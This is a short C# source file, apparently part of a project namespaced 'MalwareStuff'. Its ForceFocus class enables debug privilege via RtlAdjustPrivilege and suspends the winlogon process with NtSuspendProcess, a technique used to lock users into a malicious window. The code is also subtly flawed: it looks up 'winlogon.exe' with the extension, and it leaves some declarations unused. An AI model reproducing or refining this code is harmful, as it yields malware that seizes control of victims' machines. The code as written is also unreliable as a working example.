using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Survival.MalwareStuff
{
    public class ForceFocus
    {
        [DllImport("kernel32.dll")]
        private static extern IntPtr LoadLibrary(string dllName);
        [DllImport("ntdll.dll")]
        private static extern long RtlAdjustPrivilege(ulong privilege, bool enable, bool currentThread, out bool previousValue);
        [DllImport("ntdll.dll")]
        private static extern long NtSuspendProcess(IntPtr hProcess);
        [DllImport("ntdll.dll")]
        private static extern long NtResumeProcess(IntPtr hProcess);

        public void Enable()
        {
            Process[] winLogonProcesses = Process.GetProcessesByName("winlogon.exe");
            if(winLogonProcesses.Length > 0)
            {
                int pid = winLogonProcesses[0].Id;
                bool dummy;
                RtlAdjustPrivilege(20, true, false, out dummy);

                IntPtr handle = winLogonProcesses[0].Handle;
                NtSuspendProcess(handle);
            }
        }
    }
}
